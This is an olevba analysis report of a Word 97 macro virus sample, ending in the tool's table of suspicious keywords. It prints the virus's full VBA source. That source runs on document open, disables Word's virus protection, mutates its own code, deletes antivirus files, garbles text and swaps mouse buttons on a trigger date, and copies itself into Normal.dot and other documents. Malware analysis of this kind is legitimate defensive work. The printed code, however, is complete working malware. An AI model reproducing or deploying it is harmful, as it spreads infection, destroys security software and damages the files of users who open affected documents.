olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK2.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK2.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Qf914.bas 
in file: Virus.MSWord.VMPCK2.i - OLE stream: 'Macros/VBA/Qf914'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
Declare Function SwapMouseButton Lib "USER32" (ByVal bSwap As Long) As Long

Sub AutoOpen()

    ' Word97 Macro Virii Creation Kit
    ' ===============================
    ' Code by Jack Twoflower/LzØ Vx
    ' ===============================
    ' W97M.w97mvckbased

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Qf914").Export "C:\Qf914.sys"
 'This code is a changed version of APMRS | Thanks Pyro
JgAr0 = Application.VBE.SelectedVBComponent.Name
For KD90 = 1 To 20
UgEx842 = ""
PsLn775 = Application.VBE.ActiveVBProject.VBComponents.Item(JgAr0).CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
HhNi187 = Int(Rnd * PsLn775) + 1
VlPk738 = Int(Rnd * 40)
For x = 1 To VlPk738
UgEx842 = UgEx842 & Chr(65 + (Rnd * 22)) & Int(Rnd * 999)
Next x
Application.VBE.ActiveVBProject.VBComponents.Item(JgAr0).CodeModule.InsertLines HhNi187, "Rem " & UgEx842
Next KD90
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
If Day(Now()) = 30 And Month(Now()) = 1 Then
Dim a As Variant
Dim b As Variant
Selection.WholeStory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.WholeStory
Selection.Cut
WordBasic.Insert e$
While ShowCursor(False) >= 0
Wend
SwapMouseButton &H2
End If
Set Jx985 = ActiveDocument.VBProject.VBComponents
Set Ht615 = NormalTemplate.VBProject.VBComponents
For y = 1 To Ht615.Count
If Ht615(y).Name = "Qf914" Then Ai600 = True
Next y
For y = 1 To Jx985.Count
If Jx985(y).Name = "Qf914" Then Li896 = True
Next y
If Ai600 = True And Li896 = True Then Exit Sub
If Ai600 = True And Li896 <> True Then Jx985.Import "c:\Qf914.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Ai600 <> True And Li896 = True Then Ht615.Import "c:\Qf914.sys": NormalTemplate.Save
If Day(Now()) = 31 Then MsgBox "This virus was created with W97MVCK by Jack Twoflower"
End Sub
Sub ExtrasMakro()
Call AutoOpen
Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim DropListBox2__$(0)
DropListBox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"
WordBasic.BeginDialog 620, 280, "Makros"
WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
WordBasic.PushButton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
WordBasic.CancelButton 470, 38, 137, 21
WordBasic.PushButton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
WordBasic.PushButton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
WordBasic.PushButton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
WordBasic.PushButton 470, 154, 137, 21, "&Löschen...", "Definierbar6"
WordBasic.PushButton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
WordBasic.DropListBox 90, 196, 354, 19, DropListBox2__$(), "Listbox2"
WordBasic.Text 7, 222, 109, 13, "Beschreibung:", "Text2"
WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
x = WordBasic.Dialog.UserDialog(dlg)
Select Case x
Case 0
WordBasic.Cancel
Case 1 To 6
WordBasic.MsgBox "Nicht genug Arbeitsspeicher! Schließen Sie eine oder mehrere Anwendungen!", "WordBasic Fehler=7", 48
End Select
End Sub
Sub AnsichtCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtVBCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub DateiDokVorlagen()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub FormatFormatvorlage()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

